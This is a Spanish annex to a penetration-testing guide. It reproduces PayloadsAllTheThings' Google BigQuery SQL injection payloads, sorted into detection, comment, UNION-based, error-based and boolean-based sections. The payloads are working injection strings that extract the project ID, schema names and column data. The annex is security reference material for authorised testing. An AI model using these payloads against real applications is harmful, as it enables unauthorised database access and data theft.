# SQL injection: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [SQL Injection/BigQuery Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/SQL%20Injection/BigQuery%20Injection.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. Google BigQuery Inyección SQL / Detection

### Variantes presentes en tablas o texto del apartado

```text
'
SELECT .... FROM
AS ...
SELECT @@project_id
SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA
select * from project_id.dataset_name.table_name
```

## 2. Google BigQuery Inyección SQL / BigQuery Comment

### Variantes presentes en tablas o texto del apartado

```text
#
/* PostgreSQL Comment */
```

## 3. Google BigQuery Inyección SQL / BigQuery Basada en UNION

```ps1
UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT 'asd'),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
true) GROUP BY column_name LIMIT 1 UNION ALL SELECT (SELECT @@project_id),1,1,1,1,1,1)) AS T1 GROUP BY column_name#
' GROUP BY column_name UNION ALL SELECT column_name,1,1 FROM  (select column_name AS new_name from `project_id.dataset_name.table_name`) AS A GROUP BY column_name#
```

## 4. Google BigQuery Inyección SQL / BigQuery Basada en errores

### Variantes presentes en tablas o texto del apartado

```text
' OR if(1/(length((select('a')))-1)=1,true,false) OR '
select CAST(@@project_id AS INT64)
```

## 5. Google BigQuery Inyección SQL / BigQuery Boolean Based

```ps1
' WHERE SUBSTRING((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='A'#
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
